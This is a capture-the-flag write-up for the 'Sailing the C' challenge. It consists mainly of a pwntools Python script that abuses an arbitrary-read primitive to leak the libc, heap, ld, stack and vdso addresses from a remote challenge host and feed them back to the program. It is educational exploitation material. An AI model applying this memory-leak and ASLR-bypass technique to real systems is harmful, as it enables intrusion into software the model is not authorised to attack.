# Sailing the C
## Resource
`chall.c` - source file  
`DockerFile`
## Author
corgo
## Solution
This challenge provided us a free arbitary read function with unlimited calling count. We can use [pwnlib.DynELF](https://docs.pwntools.com/en/stable/dynelf.html) to leak the address automatically, or we can do it mannually.  
`solve.py`:  
```python
from pwn import *

context.log_level = 'debug'

binary = ELF("./chall")
libc = ELF("./libc.so.6")

conn = remote("challs.pwnoh.io", 13375)

# configure with `pwninit`
# conn = process(["ld-2.35.so", "./chall"], env={"LD_PRELOAD": "./libc.so.6"})
# conn = gdb.debug("./chall", "c")

def send(inp):
    conn.recvuntil(b"Where to, captain?")
    conn.sendline(inp)
def recv():
    conn.recvuntil(b"We gathered ")
    return int(conn.recvline().decode().removesuffix(" gold coins.\n"))

def leak(address):
    send(str(address).encode())
    data = recv().to_bytes(8, 'little')
    # log.debug("%#x => %s", address, enhex(data or ''))
    return data

chall_addr = 0x00400000

send(str(binary.got["puts"]).encode())
libc_puts_addr = recv()
print("libc_puts_addr", hex(libc_puts_addr))
libc_base_addr = libc_puts_addr + (0x7c499a871000 - 136655567539168) # ofs from one known try
print("libc_base_addr", hex(libc_base_addr))

# need to compile the chall binary in docker, or just not pass the binary to DynELF
d = DynELF(leak, binary.symbols["main"], elf=binary)
resolved_libc = d.lookup(None, "libc")
print("resolved libc = ", hex(resolved_libc))
# OR
# int.from_bytes(leak(libc.sym['__curbrk'], 'little') - 0x21000
resolved_heap = d.heap() - 0x21000
print("resolved heap = ", hex(resolved_heap))

# OR
# resolved_libc + constant offset
resolved_ld = d.lookup(None, "ld")
print("resolved ld = ", hex(resolved_ld))

environ_ptr = libc.symbols['environ'] + libc_puts_addr - libc.symbols['puts']
environ = int.from_bytes(leak(environ_ptr), 'little')
stack_address = ((environ - 0x1f000) // 0x1000) * 0x1000
print("stack_address = ", hex(stack_address))

# By search vdso address content in gdb
vdso = int.from_bytes(leak(libc_puts_addr - libc.symbols["puts"] + 0x22E000 + 0x39DC8), 'little')
print("vdso = ", hex(vdso))

# exit sailing
send(b"0")

conn.recvuntil(b"?")
conn.sendline(str(chall_addr).encode())

conn.recvuntil(b"[heap]?")
conn.sendline(str(resolved_heap).encode())

conn.recvuntil(b"?") # libc
conn.sendline(str(resolved_libc).encode())

conn.recvuntil(b"?") # ld, is 0x3c000 long
conn.sendline(str(resolved_ld).encode())

# stack, is 0x21000 long
conn.recvuntil(b"[stack]?")

# d.stack() is incorrect
# conn.sendline(str(d.stack()).encode())
# Notice: Subject to fail, may need to retry several time
conn.sendline(str(stack_address).encode())

conn.recvuntil(b"[vvar]?") # vvar, is 0x4000 long
conn.sendline(str(vdso - 0x4000).encode())

conn.recvuntil(b"[vdso]?") # vdso, is 0x2000 long
conn.sendline(str(vdso).encode())

conn.recvuntil(b"[vsyscall]?")
conn.sendline(str(0xffffffffff600000).encode())

conn.interactive()

```